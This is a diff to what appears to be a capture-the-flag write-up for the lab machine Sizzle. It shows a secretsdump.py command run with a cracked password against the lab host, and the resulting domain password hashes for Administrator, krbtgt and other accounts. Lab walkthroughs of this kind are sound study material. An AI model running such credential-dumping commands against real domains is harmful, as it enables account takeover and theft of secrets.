@@ -169,3 +169,23 @@ mrlky
 Football#7
 ```
 
+What i learnt from it is the repeat the process like run the secretdump.py again as it gave error in the amanda time but worked for mrlky. So keep in mind to repeat the process for each user cuz you never knew what you will get.
+
+```
+secretsdump.py Sizzle.HTB.local/mrlky:Football#7@10.10.10.103
+```
+
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
+mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
+sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
+SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:19ed5345c5594385f12a292d26cd5206:::
+```
+
+Will enumerate know on post enumeration attacks as we have got the valid user names.
+
+
